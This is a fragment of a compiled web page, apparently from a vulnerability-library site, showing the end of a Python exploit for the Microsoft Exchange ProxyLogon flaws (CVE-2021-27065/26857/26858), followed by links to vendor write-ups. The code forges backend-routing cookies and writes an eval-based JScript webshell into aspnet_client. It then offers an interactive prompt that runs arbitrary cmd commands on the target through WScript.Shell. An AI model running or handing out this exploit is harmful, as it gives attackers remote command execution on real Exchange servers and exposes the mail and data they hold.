    FILE_PATH <span class="token operator">=</span> <span class="token string">&#39;C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\PeiQi.aspx&#39;</span>
    FILE_DATA <span class="token operator">=</span> <span class="token string">&#39;&lt;script language=&quot;JScript&quot; runat=&quot;server&quot;&gt;function Page_Load(){eval(Request[&quot;PeiQi&quot;],&quot;unsafe&quot;);}&lt;/script&gt;&#39;</span>

    vuln_url <span class="token operator">=</span> <span class="token string">&#39;/ecp/DDI/DDIService.svc/SetObject&#39;</span>
    qs <span class="token operator">=</span> urlencode<span class="token punctuation">(</span><span class="token punctuation">{</span>
        <span class="token string">&#39;schema&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;OABVirtualDirectory&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;msExchEcpCanary&#39;</span><span class="token punctuation">:</span> canary
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span>
        <span class="token string">&#39;identity&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
            <span class="token string">&#39;__type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Identity:ECP&#39;</span><span class="token punctuation">,</span>
            <span class="token string">&#39;DisplayName&#39;</span><span class="token punctuation">:</span> identity<span class="token punctuation">[</span><span class="token string">&#39;DisplayName&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string">&#39;RawIdentity&#39;</span><span class="token punctuation">:</span> identity<span class="token punctuation">[</span><span class="token string">&#39;RawIdentity&#39;</span><span class="token punctuation">]</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&#39;properties&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
            <span class="token string">&#39;Parameters&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
                <span class="token string">&#39;__type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&#39;</span><span class="token punctuation">,</span>
                <span class="token string">&#39;ExternalUrl&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;http://f/&#39;</span> <span class="token operator">+</span> FILE_DATA
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;X-Clientapplication&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Outlook/15.0.4815.1002&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;X-Requestid&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;x&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;X-Requesttype&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Connect&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Cookie&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;X-BEResource=a]@{}:444{}?{}#~1941962753;ASP.NET_SessionId={};msExchEcpCanary={}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>
            computer_name<span class="token punctuation">,</span> vuln_url<span class="token punctuation">,</span> qs<span class="token punctuation">,</span> session_id<span class="token punctuation">,</span> canary<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;application/json&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;msExchLogonMailbox&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;S-1-5-20&#39;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    url <span class="token operator">=</span> <span class="token string">&quot;https://{}/ecp/PeiQi.js&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>
    requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>InsecureRequestWarning<span class="token punctuation">)</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 通过OAB设置Webshell成功\\033[0m&quot;</span><span class="token punctuation">)</span>

    vuln_url <span class="token operator">=</span> <span class="token string">&quot;/ecp/DDI/DDIService.svc/SetObject&quot;</span>
    qs <span class="token operator">=</span> urlencode<span class="token punctuation">(</span><span class="token punctuation">{</span>
        <span class="token string">&#39;schema&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;ResetOABVirtualDirectory&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;msExchEcpCanary&#39;</span><span class="token punctuation">:</span> canary
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span>
        <span class="token string">&#39;identity&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
            <span class="token string">&#39;__type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Identity:ECP&#39;</span><span class="token punctuation">,</span>
            <span class="token string">&#39;DisplayName&#39;</span><span class="token punctuation">:</span> identity<span class="token punctuation">[</span><span class="token string">&#39;DisplayName&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string">&#39;RawIdentity&#39;</span><span class="token punctuation">:</span> identity<span class="token punctuation">[</span><span class="token string">&#39;RawIdentity&#39;</span><span class="token punctuation">]</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&#39;properties&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
            <span class="token string">&#39;Parameters&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
                <span class="token string">&#39;__type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&#39;</span><span class="token punctuation">,</span>
                <span class="token string">&#39;FilePathName&#39;</span><span class="token punctuation">:</span> FILE_PATH
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;X-Clientapplication&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Outlook/15.0.4815.1002&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;X-Requestid&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;x&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;X-Requesttype&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Connect&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Cookie&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;X-BEResource=a]@{}:444{}?{}#~1941962753;ASP.NET_SessionId={};msExchEcpCanary={}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>
            computer_name<span class="token punctuation">,</span> vuln_url<span class="token punctuation">,</span> qs<span class="token punctuation">,</span> session_id<span class="token punctuation">,</span> canary<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;application/json&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;msExchLogonMailbox&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;S-1-5-20&#39;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    url <span class="token operator">=</span> <span class="token string">&quot;https://{}/ecp/PeiQi.js&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>
    requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>InsecureRequestWarning<span class="token punctuation">)</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 正在尝试写入Webshell\\033[0m&quot;</span><span class="token punctuation">)</span>

    vuln_url <span class="token operator">=</span> <span class="token string">&quot;/ecp/DDI/DDIService.svc/SetObject&quot;</span>
    qs <span class="token operator">=</span> urlencode<span class="token punctuation">(</span><span class="token punctuation">{</span>
        <span class="token string">&#39;schema&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;OABVirtualDirectory&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;msExchEcpCanary&#39;</span><span class="token punctuation">:</span> canary
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span>
        <span class="token string">&#39;identity&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
            <span class="token string">&#39;__type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Identity:ECP&#39;</span><span class="token punctuation">,</span>
            <span class="token string">&#39;DisplayName&#39;</span><span class="token punctuation">:</span> identity<span class="token punctuation">[</span><span class="token string">&#39;DisplayName&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string">&#39;RawIdentity&#39;</span><span class="token punctuation">:</span> identity<span class="token punctuation">[</span><span class="token string">&#39;RawIdentity&#39;</span><span class="token punctuation">]</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">&#39;properties&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
            <span class="token string">&#39;Parameters&#39;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
                <span class="token string">&#39;__type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&#39;</span><span class="token punctuation">,</span>
                <span class="token string">&#39;ExternalUrl&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;&#39;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;X-Clientapplication&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Outlook/15.0.4815.1002&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;X-Requestid&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;x&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;X-Requesttype&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Connect&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Cookie&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;X-BEResource=a]@{}:444{}?{}#~1941962753;ASP.NET_SessionId={};msExchEcpCanary={}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>
            computer_name<span class="token punctuation">,</span> vuln_url<span class="token punctuation">,</span> qs<span class="token punctuation">,</span> session_id<span class="token punctuation">,</span> canary<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;application/json&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;msExchLogonMailbox&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;S-1-5-20&#39;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    url <span class="token operator">=</span> <span class="token string">&quot;https://{}/ecp/PeiQi.js&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>
    requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>InsecureRequestWarning<span class="token punctuation">)</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 清除 OAB\\033[0m&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 正在验证 Webshell是否上传成功..........\\033[0m&quot;</span><span class="token punctuation">)</span>
    webshell_url <span class="token operator">=</span> <span class="token string">&quot;https://&quot;</span> <span class="token operator">+</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/aspnet_client/PeiQi.aspx&quot;</span>
    requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>InsecureRequestWarning<span class="token punctuation">)</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>webshell_url<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> <span class="token string">&quot;Name&quot;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 上传 Webshll成功, 地址为:{}\\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">&quot;https://&quot;</span> <span class="token operator">+</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/aspnet_client/PeiQi.aspx&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 响应为:\\n{}\\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            Cmd <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mCmd &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>InsecureRequestWarning<span class="token punctuation">)</span>
            Cmd_url <span class="token operator">=</span> <span class="token string">&quot;https://&quot;</span> <span class="token operator">+</span> target_url <span class="token operator">+</span> <span class="token string">&#39;/aspnet_client/PeiQi.aspx?PeiQi=Response.Write(new%20ActiveXObject(&quot;WScript.Shell&quot;).exec(&quot;cmd /c {}&quot;).StdOut.ReadAll());&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>Cmd<span class="token punctuation">)</span>
            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>Cmd_url<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 响应为:\\n{}\\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    <span class="token builtin">reload</span><span class="token punctuation">(</span>sys<span class="token punctuation">)</span>  
    sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">&#39;utf8&#39;</span><span class="token punctuation">)</span>  
    title<span class="token punctuation">(</span><span class="token punctuation">)</span>
    target_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mPlease input Attack Url\\nUrl &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    Email <span class="token operator">=</span> <span class="token string">&quot;Administrator@{}&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>get_fld<span class="token punctuation">(</span><span class="token string">&quot;https://&quot;</span> <span class="token operator">+</span> target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 请求地址:{}，使用的邮箱:{}\\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> Email<span class="token punctuation">)</span><span class="token punctuation">)</span>
    POC_1<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> Email<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,17);function b(g,_){const s=o("ExternalLinkIcon");return c(),i("div",null,[u,n("p",null,[n("a",r,[a("https://www.praetorian.com/blog/reproducing-proxylogon-exploit/"),t(s)])]),n("p",null,[n("a",k,[a("https://www.crowdstrike.com/blog/falcon-complete-stops-microsoft-exchange-server-zero-day-exploits/"),t(s)])]),n("p",null,[n("a",d,[a("https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/"),t(s)])]),n("p",null,[n("a",v,[a("https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"),t(s)])]),m])}const h=e(l,[["render",b],["__file","Microsoft Exchange 远程命令执行 CVE-2021-27065 26857 26858.html.vue"]]);export{h as default};
